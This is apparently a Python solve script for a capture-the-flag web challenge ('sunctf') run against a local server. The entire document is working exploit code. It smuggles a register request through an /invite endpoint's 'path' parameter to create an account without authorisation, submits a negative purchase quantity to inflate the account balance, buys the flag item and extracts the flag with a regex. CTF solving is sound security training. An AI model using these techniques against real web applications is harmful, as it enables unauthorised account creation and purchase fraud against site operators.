import requests
import re

URL = "http://localhost:5003"
MYUSERNAME = "shensunwayuniversitycollege"
MYPASSWORD = "shensunwayuniversitycollege"
pattern = r'sunctf{.*?}'

s = requests.Session()

data = {
    "username" : "a", # any value
    "password" : "b", # any value
    "path" : f"/register?username={MYUSERNAME}&password={MYPASSWORD}"
}

s.post(URL + "/invite", data=data)

data = {
    "username" : MYUSERNAME,
    "password" : MYPASSWORD
}
s.post(URL + "/login", data=data)

data ={
    "quantity": -10
}

s.post(URL + "/purchase/1", data=data)

data ={
    "quantity": 1
}

s.post(URL + "/purchase/2", data=data)

r = s.get(URL + "/account")

match = re.search(pattern, r.text)
if match:
    print(match.group())
else:
    print("[*] Flag not found")